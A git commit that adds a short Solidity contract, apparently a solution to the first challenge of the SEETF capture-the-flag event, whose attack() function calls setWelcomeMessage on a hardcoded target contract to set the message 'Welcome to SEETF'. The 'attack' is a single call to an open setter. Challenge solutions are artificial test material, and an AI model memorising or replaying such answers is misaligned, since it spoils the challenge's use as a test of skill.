6bc08eeb6e2943a9f47a432874c37716133772a5
CharesFang <42707185+CharesFang@users.noreply.github.com>
2022-06-04 15:17:25 +0800

    writeup for question1

---
+++ smart_contracts/writeups/writeup_1.sol
@@ -0,0 +1,15 @@
+pragma solidity ^0.8.0;
+
+interface Target {
+    function setWelcomeMessage(string memory _welcomeMessage) external;
+}
+
+contract Writeup {
+    Target private target =  Target(0x5cf50385021BDFf8Afa19dFF6aeba231346d8DF1);
+
+    function attack() external {
+        string memory my_msg = "Welcome to SEETF";
+        target.setWelcomeMessage(my_msg);
+    }
+}
+
